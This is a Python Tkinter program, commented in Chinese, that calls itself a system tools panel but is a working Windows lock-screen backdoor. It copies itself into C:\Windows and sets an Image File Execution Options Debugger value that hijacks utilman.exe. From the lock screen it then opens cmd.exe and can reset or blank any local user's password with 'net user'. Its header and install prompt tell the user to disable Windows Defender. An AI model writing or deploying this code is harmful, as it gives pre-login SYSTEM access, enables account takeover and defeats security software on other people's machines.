"""
***************************************************
系统工具面板 - 密码管理、命令提示符、任务管理器、记事本等功能集合
注意：
编译时请将名字改为lockmgr.exe
请关闭windows defender等安全软件的实时保护
***************************************************
"""
import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import sys
import os
import winreg
import ctypes
import shutil

# ==================== 常量和配置 ====================
AUTHOR = "wyc"
WEBSITE = "https://jbcfz.cloudns.be"
VERSION = "1.0.0"
REGISTRY_PATH = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
TARGET_EXE = "utilman.exe"
DEST_PATH = r"C:\Windows\lockmgr.exe"


# ==================== 管理员权限相关 ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# ==================== 注册表操作 ====================
def check_image_hijack():
    try:
        key_path = f"{REGISTRY_PATH}\\{TARGET_EXE}"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False


def install_image_hijack():
    try:
        current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        if os.path.abspath(current_path).lower() != os.path.abspath(DEST_PATH).lower():
            shutil.copy2(current_path, DEST_PATH)

        key_path = f"{REGISTRY_PATH}\\{TARGET_EXE}"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, DEST_PATH)
        winreg.CloseKey(key)
        return True, "安装成功！"
    except Exception as e:
        return False, str(e)


# ==================== 窗口置顶工具函数 ====================
def set_topmost(window):
    window.attributes('-topmost', True)
    window.lift()
    window.focus_force()


def create_toplevel(parent, title, geometry):
    window = tk.Toplevel(parent)
    window.title(title)
    window.geometry(geometry)
    window.resizable(False, False)
    set_topmost(window)
    return window


# ==================== 系统命令执行 ====================
def run_system_command(cmd_list):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    try:
        result = subprocess.run(
            cmd_list,
            capture_output=True,
            text=True,
            encoding="gbk",
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        return result.returncode == 0, result.stdout + result.stderr
    except Exception as e:
        return False, str(e)


# ==================== 密码管理相关 ====================
def get_local_users():
    users = []
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        cmd = 'wmic useraccount where "localaccount=true" get name /value'
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding="gbk",
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=True
        )
        
        if result.stdout:
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Name="):
                    username = line.split("=", 1)[1].strip()
                    if username and username not in [
                        "Administrator", "DefaultAccount", 
                        "Guest", "WDAGUtilityAccount"
                    ]:
                        users.append(username)
    except:
        pass
    
    if users:
        return users
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        result = subprocess.run(
            ["net", "user"],
            capture_output=True,
            text=True,
            encoding="gbk",
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.stdout:
            lines = result.stdout.splitlines()
            in_user_list = False
            for line in lines:
                line = line.strip()
                if line.startswith("---"):
                    in_user_list = True
                    continue
                if in_user_list and line:
                    if "命令成功完成" in line or "命令成功" in line:
                        break
                    parts = line.split()
                    for part in parts:
                        if part and part not in [
                            "Administrator", "DefaultAccount", 
                            "Guest", "WDAGUtilityAccount"
                        ]:
                            users.append(part)
    except:
        pass
    
    return users


def change_password(username, new_password):
    return run_system_command(["net", "user", username, new_password])


def clear_password(username):
    return run_system_command(["net", "user", username, ""])


# ==================== 主窗口 ====================
class MainWindow:
    def __init__(self, parent=None):
        if parent:
            self.window = create_toplevel(parent, "系统工具", "400x350")
        else:
            self.window = tk.Tk()
            self.window.title("系统工具")
            self.window.geometry("400x350")
            self.window.resizable(False, False)
            set_topmost(self.window)

        title_label = tk.Label(
            self.window, text="系统工具面板", font=("Arial", 16, "bold")
        )
        title_label.pack(pady=20)

        button_frame = tk.Frame(self.window)
        button_frame.pack(pady=10)

        self.pwd_btn = tk.Button(
            button_frame, text="密码管理", width=20, height=2,
            command=self.open_password_manager
        )
        self.pwd_btn.grid(row=0, column=0, padx=10, pady=5)

        self.cmd_btn = tk.Button(
            button_frame, text="打开命令提示符", width=20, height=2,
            command=self.open_cmd
        )
        self.cmd_btn.grid(row=0, column=1, padx=10, pady=5)

        self.taskmgr_btn = tk.Button(
            button_frame, text="任务管理器", width=20, height=2,
            command=self.open_taskmgr
        )
        self.taskmgr_btn.grid(row=1, column=0, padx=10, pady=5)

        self.notepad_btn = tk.Button(
            button_frame, text="记事本", width=20, height=2,
            command=self.open_notepad
        )
        self.notepad_btn.grid(row=1, column=1, padx=10, pady=5)

        self.about_btn = tk.Button(
            button_frame, text="关于程序", width=20, height=2,
            command=self.show_about
        )
        self.about_btn.grid(row=2, column=0, padx=10, pady=5, columnspan=2)

        self.child_windows = []

        if not parent:
            self.window.mainloop()

    def open_password_manager(self):
        self._close_child_windows_of_type(PasswordManager)
        child = PasswordManager(self.window)
        self.child_windows.append(child)

    def open_cmd(self):
        try:
            subprocess.Popen(["cmd.exe"])
        except:
            messagebox.showerror("错误", "无法打开命令提示符")

    def open_taskmgr(self):
        try:
            subprocess.Popen(["taskmgr.exe"])
        except:
            messagebox.showerror("错误", "无法打开任务管理器")

    def open_notepad(self):
        try:
            subprocess.Popen(["notepad.exe"])
        except:
            messagebox.showerror("错误", "无法打开记事本")

    def show_about(self):
        self._close_child_windows_of_type(AboutDialog)
        AboutDialog(self.window)

    def _close_child_windows_of_type(self, window_class):
        for child in self.child_windows[:]:
            if isinstance(child, window_class) and hasattr(child, 'window'):
                try:
                    child.window.destroy()
                except:
                    pass
                self.child_windows.remove(child)


# ==================== 密码管理窗口 ====================
class PasswordManager:
    def __init__(self, parent):
        self.parent = parent
        self.window = create_toplevel(parent, "密码管理", "400x400")

        title = tk.Label(
            self.window, text="选择用户", font=("Arial", 14, "bold")
        )
        title.pack(pady=15)

        list_frame = tk.Frame(self.window)
        list_frame.pack(pady=10, fill=tk.BOTH, expand=True, padx=20)

        scrollbar = tk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.user_listbox = tk.Listbox(
            list_frame, yscrollcommand=scrollbar.set,
            font=("Arial", 12), selectmode=tk.SINGLE
        )
        self.user_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.user_listbox.yview)

        self.users = get_local_users()
        for user in self.users:
            self.user_listbox.insert(tk.END, user)

        btn_frame = tk.Frame(self.window)
        btn_frame.pack(pady=10)

        self.modify_btn = tk.Button(
            btn_frame, text="修改密码", width=15, height=1,
            command=self.modify_password
        )
        self.modify_btn.grid(row=0, column=0, padx=5)

        self.clear_btn = tk.Button(
            btn_frame, text="清除密码", width=15, height=1,
            command=self.clear_password_action
        )
        self.clear_btn.grid(row=0, column=1, padx=5)

        self.cancel_btn = tk.Button(
            btn_frame, text="返回", width=15, height=1,
            command=self.window.destroy
        )
        self.cancel_btn.grid(row=0, column=2, padx=5)

    def get_selected_user(self):
        selection = self.user_listbox.curselection()
        if not selection:
            messagebox.showwarning("警告", "请先选择一个用户", parent=self.window)
            return None
        return self.users[selection[0]]

    def modify_password(self):  # ✅ 正确缩进，在类里面
        """修改密码 - 改进版"""
        username = self.get_selected_user()
        if not username:
            return

        # 创建密码输入对话框
        dialog = tk.Toplevel(self.window)
        dialog.title("输入新密码")
        dialog.geometry("350x150")
        dialog.resizable(False, False)
        dialog.attributes('-topmost', True)
        dialog.transient(self.window)
        dialog.grab_set()

        # 使用字典存储结果，确保可变性
        result = {'password': None, 'confirmed': False}

        prompt_label = tk.Label(
            dialog,
            text=f"请输入 {username} 的新密码：",
            font=("Arial", 11)
        )
        prompt_label.pack(pady=15)

        password_entry = tk.Entry(
            dialog,
            font=("Arial", 12),
            width=30,
            show="*"
        )
        password_entry.pack(pady=10)
        password_entry.focus()

        def on_ok():
            result['password'] = password_entry.get()
            result['confirmed'] = True
            dialog.destroy()

        def on_cancel():
            result['password'] = None
            result['confirmed'] = False
            dialog.destroy()

        btn_frame = tk.Frame(dialog)
        btn_frame.pack(pady=10)

        ok_btn = tk.Button(btn_frame, text="确定", width=10, command=on_ok)
        ok_btn.pack(side=tk.LEFT, padx=5)

        cancel_btn = tk.Button(btn_frame, text="取消", width=10, command=on_cancel)
        cancel_btn.pack(side=tk.LEFT, padx=5)

        dialog.bind('<Return>', lambda e: on_ok())
        dialog.bind('<Escape>', lambda e: on_cancel())

        # 等待对话框关闭
        self.window.wait_window(dialog)

        # 检查结果
        if not result['confirmed']:
            return

        new_password = result['password']
        
        # 检查密码是否为空
        if not new_password:
            messagebox.showwarning("警告", "密码不能为空！", parent=self.window)
            return

        # 确认修改
        confirm = messagebox.askyesno(
            "确认修改",
            f"是否确定将 {username} 的密码修改为 {new_password}？",
            parent=self.window
        )

        if not confirm:
            return

        # 关闭密码管理窗口
        self.window.destroy()

        # 执行修改
        success, msg = change_password(username, new_password)

        # 显示结果
        if success:
            messagebox.showinfo("操作结果", f"{username} 的密码修改成功！")
        else:
            messagebox.showerror("操作结果", f"修改失败：{msg}")

    def clear_password_action(self):  # ✅ 正确缩进，在类里面，和 modify_password 平级
        """清除密码"""
        username = self.get_selected_user()
        if not username:
            return

        confirm = messagebox.askyesno(
            "确认清除",
            f"是否清除 {username} 的密码？\n\n警告：清除后该账户将没有密码！",
            parent=self.window
        )

        if not confirm:
            return

        self.window.destroy()

        success, msg = clear_password(username)

        if success:
            messagebox.showinfo("操作结果", f"{username} 的密码清除成功！")
        else:
            messagebox.showerror("操作结果", f"清除失败：{msg}")


# ==================== 关于对话框 ====================
class AboutDialog:
    def __init__(self, parent):
        self.window = create_toplevel(parent, "关于程序", "350x250")

        title = tk.Label(
            self.window, text="系统工具面板", font=("Arial", 18, "bold")
        )
        title.pack(pady=20)

        version_label = tk.Label(
            self.window, text=f"版本：{VERSION}", font=("Arial", 12)
        )
        version_label.pack(pady=5)

        author_label = tk.Label(
            self.window, text=f"作者：{AUTHOR}", font=("Arial", 12)
        )
        author_label.pack(pady=5)

        website_label = tk.Label(
            self.window, text=f"官方网站：{WEBSITE}",
            font=("Arial", 12), fg="blue", cursor="hand2"
        )
        website_label.pack(pady=5)

        close_btn = tk.Button(
            self.window, text="关闭", width=15,
            command=self.window.destroy
        )
        close_btn.pack(pady=20)


# ==================== 主入口 ====================
def main():
    if check_image_hijack():
        root = tk.Tk()
        root.withdraw()
        app = MainWindow()
        root.mainloop()
    else:
        root = tk.Tk()
        root.withdraw()
        set_topmost(root)
        
        response = messagebox.askyesno(
            "安装提示",
            "检测到未安装映像劫持。\n\n"
            "需要执行以下操作：\n"
            "1. 关闭系统实时保护\n"
            "2. 将本程序改名为 lockmgr.exe\n\n"
            "是否继续安装？"
        )
        
        if not response:
            root.destroy()
            sys.exit()
        
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            root.destroy()
            sys.exit()
        
        success, msg = install_image_hijack()
        
        if success:
            messagebox.showinfo("安装成功", msg + "\n\n锁屏界面点击'轻松使用'即可启动程序。")
            root.destroy()
            root2 = tk.Tk()
            root2.withdraw()
            app = MainWindow()
            root2.mainloop()
        else:
            messagebox.showerror("安装失败", msg)
            root.destroy()
            sys.exit()


if __name__ == "__main__":
    main()